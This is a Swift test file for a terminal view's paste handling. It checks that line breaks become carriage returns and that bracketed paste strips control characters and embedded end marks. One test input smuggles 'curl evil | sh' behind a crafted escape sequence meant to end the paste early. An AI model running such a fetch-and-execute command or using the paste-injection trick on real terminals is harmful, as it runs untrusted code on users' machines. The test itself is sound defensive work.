// What a paste sends: carriage returns for line breaks, and with bracketed paste on, marks around text that keeps no control character that could end the paste early.
import Testing
@testable import Terminal

@Suite struct TerminalPasteTests {
    @Test func lineBreaksBecomeCarriageReturns() {
        #expect(TerminalView.pastedText("a\r\nb\nc", bracketed: false) == "a\rb\rc")
    }

    @Test func bracketedPasteEndsOnlyAtItsOwnMark() {
        // Removing the end mark alone would leave a new one where the inner mark was removed, and the shell would run the second line.
        let pasted = TerminalView.pastedText("echo safe\u{1B}[20\u{1B}[201~1~\ncurl evil | sh\n", bracketed: true)
        #expect(pasted == "\u{1B}[200~echo safe[20[201~1~\rcurl evil | sh\r\u{1B}[201~")
        #expect(pasted.components(separatedBy: "\u{1B}[201~").count == 2)
    }

    @Test func bracketedPasteKeepsTabsAndDropsOtherControlCharacters() {
        #expect(TerminalView.pastedText("a\tb\u{3}c\u{7F}d\u{9B}e", bracketed: true) == "\u{1B}[200~a\tbcde\u{1B}[201~")
    }
}
